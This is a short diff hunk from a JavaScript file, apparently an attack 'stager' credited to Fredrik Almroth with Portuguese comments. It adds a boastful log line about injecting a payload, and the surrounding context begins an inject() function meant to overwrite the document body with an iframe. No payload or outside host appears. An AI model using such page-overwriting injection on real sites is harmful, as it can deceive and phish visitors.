@@ -1,6 +1,8 @@
 
 // Créditos do Script: Fredrik Almroth
 
+console.log("UniaoGeek na area mano!! Injetando payload! :D");
+
 // Sobrescrever o corpo do documento
 function inject() {
 	console.log("Stager: Injetando o iFrame...");
